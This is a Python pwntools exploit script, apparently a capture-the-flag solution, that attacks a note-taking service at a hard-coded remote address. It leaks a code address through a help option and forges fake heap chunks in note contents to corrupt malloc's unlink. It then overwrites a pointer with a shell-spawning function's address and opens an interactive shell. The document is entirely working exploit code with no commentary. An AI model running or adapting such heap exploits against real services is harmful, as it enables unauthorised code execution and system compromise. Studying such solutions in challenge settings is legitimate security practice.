import struct

from pwn import *


def to_addr(n):
    return struct.pack('Q', n)

def to_n(addr):
    return struct.unpack('Q', addr)[0]

def create(pc, name):
    pc.sendlineafter('choice > ', '1')
    pc.sendlineafter('Enter content > ', name)
    return int(pc.recvline().strip().split(' ')[-2], 16)

def delete(pc, index):
    pc.sendlineafter('choice > ', '2')
    pc.sendlineafter('Enter index to delete note > ', str(index))

def help(pc):
    pc.sendlineafter('choice > ', '3')
    return int(pc.recvline().strip().split(' ')[-1], 16)


def main():
    # pc = process('./challenge')
    pc = remote('51.15.73.163', 8088)

    help_addr = help(pc)

    print(f'Help address: {hex(help_addr)}')

    get_shell = help_addr - 0xC1A + 0xA30

    addr1 = create(pc, 'AAAA') # 0
    addr2 = create(pc, 'BBBB') # 1
    addr3 = create(pc, 'CCCC') # 2

    print(f'Heap address: {hex(addr1)}')

    delete(pc, 0)

    #      |  prev_size  |  size  |        fd         |        bk        |
    fake_chunk1 = p64(0) + p64(0) + p64(addr1 + 16*7) + p64(addr1 + 16*7)  #  <- for tricking malloc
    fake_chunk2 = p64(0) + p64(0) + p64(addr1 + 16*3) + p64(addr1 + 16*3)  #  <- for unlinking

    payload = (8 + 32) * '\x00' + fake_chunk1 + 32 * 'A' + fake_chunk2 + 32 * 'A'

    print(len(payload))

    create(pc, payload + (241 - len(payload) - 9) * 'A' + '\xc0\x00\x00\x00\x00\x00\x00\x00' + '\x00')

    delete(pc, 1)

    create(pc, 'D' * (8 + 160) + p64(0) + p64(0x100) + to_addr(get_shell))

    delete(pc, 1)

    pc.interactive()


if __name__ == '__main__':
    main()